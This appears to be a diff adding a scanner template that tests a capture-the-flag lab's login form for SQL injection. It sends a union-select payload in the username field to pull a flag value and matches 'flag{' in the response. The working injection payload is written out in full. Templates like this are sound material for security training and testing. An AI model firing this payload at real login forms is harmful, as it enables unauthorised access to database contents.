@@ -1,0 +1,28 @@
+id: SQL_lab
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct sql injection 
+
+http:
+
+  - raw:
+    - |
+      GET / HTTP/2
+      Host: {{Hostname}}
+
+    - |
+      POST /login HTTP/2
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      
+      username=%27+union+select+flag_value%2Cnull+from+flag--+-&password=
+
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flag{"
